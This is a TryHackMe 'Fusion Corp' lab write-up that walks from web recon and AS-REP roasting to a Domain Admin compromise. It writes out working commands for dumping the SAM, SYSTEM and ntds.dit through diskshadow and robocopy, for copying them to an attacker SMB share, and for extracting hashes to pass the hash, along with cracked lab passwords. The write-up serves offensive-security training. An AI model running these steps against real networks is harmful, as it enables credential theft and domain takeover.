# THM Fusion Corp

> **Platform:** TryHackMe
> **OS:** Windows (Active Directory)
> **Domain:** `fusion.corp` — DC `FUSION-DC` (`Fusion-DC.fusion.corp`)
> **Theme:** web recon → AS-REP roast → LDAP description loot → **SeBackupPrivilege** → NTDS dump → Domain Admin.

> **Note on the target IP:** TryHackMe VPN — the address rotated (`10.48.139.118`, `10.49.180.201`, `10.49.180.142`, `10.49.148.18`). Substitute your own.

## Attack Path Overview

1. **Recon** – DC with an IIS website; gobuster finds a `/backup` directory.
2. **Loot** – `/backup` serves `employee_status.ods`; the spreadsheet yields employee names → usernames.
3. **AS-REP Roasting** – `lparker` has pre-auth disabled; crack → `!!abbylvzsvs2k6!`.
4. **LDAP loot** – as `lparker`, `jmurphy`'s **description** field holds a password → `u8WC3!kLsgw=#bRY`.
5. **Foothold** – WinRM as `jmurphy`, who holds **SeBackupPrivilege / SeRestorePrivilege** (Backup Operators).
6. **DA via SeBackup** – shadow-copy `ntds.dit` + save `SYSTEM`, dump offline → Domain Admin hash → Pass-the-Hash.

## 7. SeBackupPrivilege → Domain Admin

`SeBackupPrivilege` lets you read any file (bypassing ACLs). On a DC the goal is the AD database `ntds.dit`.

### 7a. (Shows local SAM only — not enough)

Saving the local SAM/SYSTEM hives is possible but on a DC that only yields the **local** Administrator hash, not the domain's:

```cmd
reg save hklm\sam sam
reg save hklm\system system
```
```bash
# on Kali
impacket-smbserver share . -smb2support
```
```cmd
copy sam \\192.168.130.62\share\sam
copy system \\192.168.130.62\share\system
```
```bash
impacket-secretsdump -sam sam -system system LOCAL
```

### 7b. Shadow-copy `ntds.dit` (domain hashes)

`ntds.dit` is locked while the DC runs, so use **diskshadow** to snapshot the volume, then read the file through the shadow copy with `SeBackupPrivilege` (robocopy `/b`).

On Kali, build the diskshadow script (DOS line endings):

```bash
gedit viper.dsh
```
```
set context persistent nowriters
add volume c: alias viper
create
expose %viper% x:
```
```bash
unix2dos viper.dsh
```

On the target:

```cmd
cd c:\windows\tasks
upload viper.dsh
diskshadow /s viper.dsh
robocopy /b x:\windows\ntds . ntds.dit
reg save hklm\system c:\windows\tasks\system
reg save hklm\sam c:\windows\tasks\sam
```

Exfil to Kali (SMB server with a user so Windows `net use` is happy):

```bash
impacket-smbserver share ./ -smb2support -user test -pass ''
```
```cmd
net use \\<KALI IP>\share /user:test
copy sam \\<KALI IP>\share
copy system \\<KALI IP>\share
copy ntds.dit \\<KALI IP>\share
```

Dump offline:

```bash
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

## Lessons Learned

- **Dir-brute every web port**; a `/backup` folder leaking a spreadsheet is a classic username source.
- **`AS-REP roast` noise**: `KDC_ERR_C_PRINCIPAL_UNKNOWN` just means that guessed username doesn't exist — the one real hash is what matters.
- **LDAP `description` fields** frequently store passwords; always enumerate them with any valid account.
- **SeBackupPrivilege ≠ local SAM on a DC.** The local SAM only gives the local admin; the domain hashes live in `ntds.dit`, which is locked — snapshot it with **diskshadow** and read it via `robocopy /b`.
- **Pass-the-Hash** the recovered domain Administrator hash (WinRM / PsExec / WMI) to finish.
